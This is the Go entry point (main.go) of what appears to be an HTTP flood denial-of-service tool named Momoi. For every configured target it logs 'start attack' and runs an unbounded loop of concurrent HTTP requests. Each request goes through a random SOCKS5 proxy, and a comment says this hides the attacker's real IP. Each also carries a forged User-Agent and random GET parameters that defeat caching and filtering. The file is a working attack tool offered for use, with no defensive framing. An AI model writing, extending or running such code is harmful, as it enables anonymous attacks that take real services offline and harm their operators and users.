/*
 * @Author: NyanCatda
 * @Date: 2023-12-13 14:05:12
 * @LastEditTime: 2023-12-13 17:47:37
 * @LastEditors: NyanCatda
 * @Description: main.go
 * @FilePath: \Momoi\main.go
 */
package main

import (
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/nyancatda/Momoi/v2/internal/Config"
	"github.com/nyancatda/Momoi/v2/internal/FakeParameters"
	"github.com/nyancatda/Momoi/v2/internal/Flag"
	"github.com/nyancatda/Momoi/v2/internal/Log"
	"github.com/nyancatda/Momoi/v2/internal/Proxy"
	"github.com/nyancatda/Momoi/v2/internal/Proxy/Socks5"
	"github.com/nyancatda/Momoi/v2/internal/TCP"
	"github.com/nyancatda/Momoi/v2/tools/Pool"
	"github.com/nyancatda/Momoi/v2/tools/Random"
	"golang.org/x/net/proxy"
)

func main() {
	// 启动
	boot()

	// 获取代理
	if Flag.Get.GetProxy {
		GetProxy()
		os.Exit(0)
	}

	// 遍历目标列表
	for _, Target := range Config.Get.Target {
		go func(Target Config.ConfigTarget) {
			Log.Print.Info("System", "start attack "+Target.Host+":"+fmt.Sprint(Target.Port))

			var Proxys []proxy.Dialer
			if Target.ProxyType != "" {
				// 获取代理
				var Proxy Proxy.Proxy

				switch Target.ProxyType {
				case "socks5":
					Proxy = Socks5.New()
				default:
					Log.Print.Error("System", errors.New("proxy type not found"))
				}

				ProxyList, err := Proxy.GetProxys()
				if err != nil {
					Log.Print.Error("System", err)
					os.Exit(1)
				}
				if len(ProxyList) == 0 {
					Log.Print.Error("System", errors.New("no proxy available"))
					os.Exit(1)
				} else {
					Proxys = ProxyList
				}
			}

			var WG = Pool.NewPool(Target.Pool)
			for {
				WG.Add(1)
				go func() {
					var ProxyDialer proxy.Dialer
					if len(Proxys) != 0 {
						ProxyDialer = Random.Array(Proxys)
					}
					// 启用代理时防止暴露真实IP
					if Target.ProxyType != "" && ProxyDialer == nil {
						Log.Print.Error("System", errors.New("no proxy available"))
						os.Exit(1)
					}

					// 伪造User-Agent
					var Header = Target.Header
					if Target.FakeParameters.UserAgent {
						if Header == nil {
							Header = make(map[string]string)
						}

						Header["User-Agent"] = FakeParameters.RandomUserAgent()
					}
					// 伪造GET参数
					var Path = Target.Path
					if Target.FakeParameters.Get {
						if find := strings.Contains(Path, "?"); find {
							// ?号是否在最后
							if Path[len(Path)-1] == '?' {
								Path += FakeParameters.RandomGet(Target.FakeParameters.RandomGetNumber)
							} else {
								Path += "&" + FakeParameters.RandomGet(Target.FakeParameters.RandomGetNumber)
							}
						} else {
							Path += "?" + FakeParameters.RandomGet(Target.FakeParameters.RandomGetNumber)
						}
					}

					// 发起请求
					TCP.HTTPRequest(ProxyDialer, Target.SSL, Target.Method, Target.Host, Target.Port, Path, Header, Target.Body)

					WG.Done()
				}()
			}
		}(Target)
	}

	// 等待
	select {}
}

func boot() {
	// 初始化日志实例
	Log.Init()

	// 初始化参数
	if err := Flag.Init(); err != nil {
		Log.Print.Error("System", err)
		os.Exit(1)
	}

	// 初始化配置文件
	_, err := Config.Init()
	if err != nil {
		// 创建配置文件
		Log.Print.Info("System", "config file not found, creating...")
		if err = Config.Create(); err != nil {
			Log.Print.Error("System", err)
			os.Exit(1)
		}
	}
}
